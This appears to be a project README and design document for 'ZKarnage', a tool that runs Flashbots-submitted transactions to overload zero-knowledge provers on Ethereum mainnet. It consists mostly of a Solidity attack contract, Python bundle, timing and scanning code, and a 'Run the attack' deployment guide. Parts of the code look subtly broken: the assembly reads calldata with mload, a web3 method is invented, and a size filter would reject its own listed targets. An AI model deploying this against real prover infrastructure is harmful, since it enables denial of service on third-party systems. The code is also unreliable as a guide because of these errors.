# ZKarnage: Zero-Knowledge Proof Stress Testing System

## Overview
ZKarnage is a specialized system designed to stress test Zero-Knowledge proof generation in Ethereum block verification systems. By exploiting the computational overhead of keccak hashing operations, ZKarnage forces provers to process massive amounts of contract bytecode, specifically targeting blocks where `block.number % 100 == 0`. This creates a "worst-case" scenario for ZK proof generation, helping identify system limitations and bottlenecks.

### Key Features
- Targets high-impact blocks (block.number % 100 == 0)
- Exploits EXTCODESIZE operations for maximum ZK circuit complexity
- Uses Flashbots for precise block targeting
- Modular design for testing different attack vectors
- Built-in monitoring and analysis tools

### Attack Impact
Current ZK proof generation for targeted blocks:
- Generation time: 4-14 minutes per block
- Cost: $0.07-1.29 per proof
- Average gas usage: ~30M per block

ZKarnage aims to stress these systems by:
- Loading ~45MiB of contract bytecode
- Forcing expensive keccak hash operations
- Maintaining relatively low gas costs (~408 gas/KB)

## System Architecture

### High-Level Components
1. Smart Contract (Attack Vector)
2. Transaction Generator
3. Flashbots Integration Layer
4. Target Contract Scanner

### Component Details

#### 1. Smart Contract (Attack Vector)

The core attack vector is implemented in a Solidity smart contract that forces the EVM to load large contract bytecode:

```solidity
contract ZKarnage {
    event ContractAccessed(address indexed target, uint256 size);
    event AttackSummary(uint256 numContracts, uint256 totalSize);
    
    function executeAttack(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 size = target.code.length;  // Forces EXTCODESIZE
            totalSize += size;
            
            emit ContractAccessed(target, size);
        }
        
        emit AttackSummary(targets.length, totalSize);
    }
}
```

Key Features:
- Uses EXTCODESIZE to force bytecode loading
- Tracks total bytecode processed
- Emits events for analysis
- Gas-optimized implementation

#### 2. Transaction Generator

Python class responsible for creating and managing attack transactions:

```python
class TransactionGenerator:
    def create_attack_transaction(self, target_contracts: List[str]) -> dict:
        tx = self.contract.functions.executeAttack(target_contracts).build_transaction({
            'from': self.account.address,
            'gas': 500000,
            'maxFeePerGas': self.w3.eth.max_priority_fee + (2 * self.w3.eth.get_block('latest')['baseFeePerGas']),
            'maxPriorityFeePerGas': self.w3.eth.max_priority_fee,
            'nonce': self.w3.eth.get_transaction_count(self.account.address),
        })
        return tx
```

Features:
- Dynamic gas estimation
- EIP-1559 fee management
- Nonce handling
- Transaction building

#### 3. Flashbots Integration Layer

Manages bundle creation and submission to Flashbots:

```python
class FlashbotsManager:
    async def submit_bundle(self, signed_tx: str, target_block: int):
        bundle = [{
            'signed_transaction': signed_tx
        }]
        
        # Simulate first
        simulation = await self.flashbots.simulate(bundle, target_block)
        
        if simulation['success']:
            # Submit for multiple blocks
            results = await asyncio.gather(*[
                self.flashbots.send_bundle(
                    bundle, 
                    target_block_number=block_num
                ) for block_num in range(target_block, target_block + 5)
            ])
            return results
        return None
```

Features:
- Bundle simulation
- Multi-block submission
- Async handling
- Error management

#### 4. Target Contract Scanner

Identifies suitable contracts for the attack:

```python
class ContractScanner:
    async def find_large_contracts(self, min_size: int = 1024 * 1024) -> List[Contract]:
        known_targets = [
            "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",  # Uniswap V2
            "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",  # Uniswap V3
        ]
        
        results = []
        for address in known_targets:
            size = len(await self.w3.eth.get_code(address))
            if size >= min_size:
                results.append(Contract(address=address, size=size))
        return results
```

Features:
- Minimum size filtering
- Parallel scanning
- Caching support
- Size verification

## Bundle Inclusion Strategy

### Block Targeting
The system uses specific strategies to ensure bundle inclusion in target blocks:

```python
class BundleManager:
    async def verify_bundle_inclusion(self, bundle_hash: str, target_block: int) -> BundleStats:
        """Monitor bundle status and timing"""
        stats = await self.flashbots.get_bundle_stats(
            bundle_hash,
            target_block
        )
        
        timing = {
            'submitted': datetime.fromisoformat(stats['submittedAt']),
            'simulated': datetime.fromisoformat(stats['simulatedAt']),
            'sent_to_builders': datetime.fromisoformat(stats['sentToMinersAt'])
        }
        
        return BundleStats(
            is_simulated=stats['isSimulated'],
            is_sent=stats['isSentToMiners'],
            timing=timing
        )

    async def simulate_bundle(
        self, 
        signed_txs: List[str], 
        target_block: int
    ) -> SimulationResult:
        """Simulate bundle execution and analyze profitability"""
        sim = await self.flashbots.simulate(
            signed_txs,
            target_block,
            target_block + 1  # State block number
        )
        
        return SimulationResult(
            gas_used=sim['totalGasUsed'],
            coinbase_diff=sim['coinbaseDiff'],
            success=not any(r.get('revert') for r in sim['results'])
        )

    async def check_competing_bundles(
        self, 
        signed_txs: List[str], 
        block_number: int
    ) -> Optional[ConflictResult]:
        """Analyze bundle conflicts and competition"""
        conflict = await self.flashbots.get_conflicting_bundle(
            signed_txs,
            block_number
        )
        
        if not conflict:
            return None
            
        return ConflictResult(
            type=conflict['conflictType'],
            competitor_gas_price=conflict['conflictingBundleGasPricing']['effectiveGasPriceToSearcher'],
            competitor_priority_fee=conflict['conflictingBundleGasPricing']['effectivePriorityFeeToMiner']
        )
```

### Inclusion Checklist Implementation
Our system implements the five key checks for bundle inclusion:

1. Transaction Validation:
```python
async def validate_transactions(self, signed_txs: List[str]) -> bool:
    sim = await self.simulate_bundle(signed_txs, self.target_block)
    
    if not sim.success:
        logger.error("Bundle simulation failed")
        return False
        
    if sim.gas_used > self.MAX_GAS_LIMIT:
        logger.error(f"Gas usage too high: {sim.gas_used}")
        return False
        
    return True
```

2. Incentive Management:
```python
def calculate_effective_price(
    self,
    gas_used: int,
    coinbase_payment: int,
    base_fee: int
) -> float:
    """Calculate effective priority fee for bundle"""
    total_cost = coinbase_payment + (gas_used * base_fee)
    return total_cost / gas_used
```

3. Competition Monitoring:
```python
async def monitor_competition(
    self,
    signed_txs: List[str],
    min_profit: int
) -> bool:
    conflict = await self.check_competing_bundles(signed_txs, self.target_block)
    
    if conflict:
        our_profit = self.calculate_profit(signed_txs)
        if our_profit < conflict.competitor_priority_fee:
            logger.warning(f"Outbid by competitor: {conflict.competitor_priority_fee}")
            return False
    
    return True
```

4. Timing Management:
```python
class TimingManager:
    MAX_SUBMISSION_DELAY = 0.5  # seconds
    
    async def submit_with_timing(
        self,
        bundle: Bundle,
        target_block: int
    ) -> bool:
        start = time.time()
        
        # Submit to multiple builders in parallel
        results = await asyncio.gather(*[
            self.submit_to_builder(bundle, builder)
            for builder in self.builders
        ])
        
        elapsed = time.time() - start
        if elapsed > self.MAX_SUBMISSION_DELAY:
            logger.warning(f"Slow submission: {elapsed}s")
            return False
            
        return any(results)
```

5. MEV-Boost Validation:
```python
async def verify_mev_boost_status(
    self,
    validator_address: str
) -> bool:
    """Check if validator runs MEV-Boost"""
    recent_blocks = await self.w3.eth.get_validator_blocks(
        validator_address,
        block_count=100
    )
    
    # Check for Flashbots bundles in recent blocks
    flashbots_count = sum(
        1 for block in recent_blocks
        if await self.has_flashbots_bundles(block)
    )
    
    return flashbots_count > 0
```

### Bundle Submission Flow
The complete submission process is orchestrated by:

```python
async def submit_stress_test_bundle(self) -> SubmissionResult:
    # 1. Create and sign bundle
    signed_txs = await self.create_signed_bundle()
    
    # 2. Validate transactions and simulate
    if not await self.validate_transactions(signed_txs):
        return SubmissionResult(success=False, reason="Validation failed")
    
    # 3. Check competition and profitability
    if not await self.monitor_competition(signed_txs, self.min_profit):
        return SubmissionResult(success=False, reason="Unprofitable")
    
    # 4. Submit with timing checks
    submission_success = await self.timing_manager.submit_with_timing(
        signed_txs,
        self.target_block
    )
    
    if not submission_success:
        return SubmissionResult(success=False, reason="Timing constraint failed")
    
    # 5. Monitor inclusion
    bundle_hash = self.calculate_bundle_hash(signed_txs)
    inclusion_stats = await self.verify_bundle_inclusion(
        bundle_hash,
        self.target_block
    )
    
    return SubmissionResult(
        success=inclusion_stats.is_sent,
        timing=inclusion_stats.timing,
        stats=inclusion_stats
    )
```

## Implementation Details

### Gas Optimization

The attack is designed to maximize ZK circuit complexity while minimizing gas costs:

```solidity
// Optional gas-optimized EXTCODECOPY variant
function executeAttackWithCopy(address[] calldata targets) external {
    for (uint256 i = 0; i < targets.length; i++) {
        uint256 size = targets[i].code.length;
        assembly {
            extcodecopy(
                mload(add(targets, mul(i, 32))), // target address
                0x80,                            // memory offset
                0,                               // code offset
                size                            // length
            )
        }
    }
}
```

### Block Targeting

The system targets specific blocks for maximum impact:

```python
def is_target_block(self, block_number: int) -> bool:
    """Targets blocks that Ethproof provers focus on"""
    return block_number % 100 == 0

async def get_next_target_block(self) -> int:
    current = await self.w3.eth.block_number
    return current + (100 - (current % 100))
```

### Error Handling

Robust error handling throughout the system:

```python
async def execute_attack(self) -> AttackResult:
    try:
        contracts = await self.scanner.find_large_contracts()
        if not contracts:
            raise NoTargetContractsError("No suitable contracts found")
            
        tx = self.tx_generator.create_attack_transaction(contracts)
        signed = self.account.sign_transaction(tx)
        
        target_block = await self.get_next_target_block()
        result = await self.flashbots.submit_bundle(signed.rawTransaction, target_block)
        
        return AttackResult(
            success=bool(result),
            target_block=target_block,
            contracts=contracts
        )
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        raise AttackExecutionError(f"Attack failed: {str(e)}") from e
```

## Performance Considerations

### Memory Management
- Smart contract uses calldata for arrays
- Minimizes memory allocations
- Efficient bytecode handling

### Transaction Timing
- Targets blocks divisible by 100
- Implements backoff strategy for failures
- Handles reorgs gracefully

### Gas Usage
- Base cost: ~39,000 gas
- Per-contract overhead: ~408 gas/KB
- Additional EXTCODECOPY cost: ~25,700 gas

## Monitoring and Analysis

### Event Logging
The system emits detailed events for analysis:

```solidity
event ContractAccessed(
    address indexed target,
    uint256 size
);

event AttackSummary(
    uint256 numContracts,
    uint256 totalSize
);
```

### Metrics Collection
Python integration for metrics:

```python
class MetricsCollector:
    async def collect_attack_metrics(self, tx_hash: str) -> AttackMetrics:
        receipt = await self.w3.eth.get_transaction_receipt(tx_hash)
        
        accessed = [
            event['args'] for event in 
            receipt.logs if event['event'] == 'ContractAccessed'
        ]
        
        return AttackMetrics(
            gas_used=receipt.gasUsed,
            contracts_accessed=len(accessed),
            total_bytes=sum(event['size'] for event in accessed)
        )
```

## Future Improvements

### Potential Enhancements
1. MODEXP precompile exploitation
2. Dynamic target discovery
3. Multi-transaction bundles
4. Parallel contract scanning
5. Automated gas optimization

### Example MODEXP Integration

```solidity
function executeModExpAttack() external {
    uint256[6] memory input;
    input[0] = 0x1000; // base length
    input[1] = 0x1000; // exponent length
    input[2] = 0x1000; // modulus length
    
    assembly {
        let success := staticcall(
            gas(),
            0x05,    // MODEXP precompile
            input,   // input pointer
            0x3000,  // input size
            0x00,    // output pointer
            0x20     // output size
        )
    }
}
```

## Requirements and Setup

### Python Dependencies
Create a `requirements.txt` file with the following dependencies:

```text
web3>=6.15.1
eth-account>=0.10.0
eth-typing>=3.5.2
eth-utils>=2.3.1
flashbots>=1.2.0
python-dotenv>=1.0.0
aiohttp>=3.9.1
async-timeout>=4.0.3
eth-abi>=4.2.1
requests>=2.31.0
typing-extensions>=4.9.0
loguru>=0.7.2
```

### Installation
1. Create and activate a virtual environment:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Create `.env` file:
```bash
touch .env
```

Add the following to `.env`:
```text
PRIVATE_KEY=your_private_key_here
RPC_URL=your_ethereum_rpc_url
FLASHBOTS_RELAY_URL=https://relay.flashbots.net
CONTRACT_ADDRESS=your_deployed_contract_address
```

### Project Structure
```
zkarnage/
├── README.md
├── requirements.txt
├── .env
├── contracts/
│   └── ZKarnage.sol
├── scripts/
│   ├── __init__.py
│   ├── bundle_manager.py
│   ├── contract_scanner.py
│   ├── flashbots_manager.py
│   └── timing_manager.py
├── tests/
│   ├── __init__.py
│   ├── test_bundle_manager.py
│   ├── test_contract_scanner.py
│   └── test_timing_manager.py
└── main.py
```

## Deployment Guide

1. Deploy smart contract:
```bash
forge create ZKarnage --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

2. Configure environment:
```bash
export PRIVATE_KEY=your_private_key
export RPC_URL=your_rpc_url
export FLASHBOTS_RELAY=https://relay.flashbots.net
```

3. Run the attack:
```bash
python3 zk_stress_test.py --contract $CONTRACT_ADDRESS --targets $TARGET_FILE
```

## Security Considerations

1. Private key management
2. RPC endpoint security
3. Gas price monitoring
4. Flashbots bundle privacy
5. Contract access controls

## Testing Strategy

1. Local hardhat network testing
2. Goerli testnet validation
3. Mainnet simulation
4. Gas profiling
5. Bundle success rate analysis

## Conclusion

This system provides a framework for stress testing ZK proof generation while maintaining reasonable gas costs. The modular design allows for easy extensions and modifications as new attack vectors are discovered.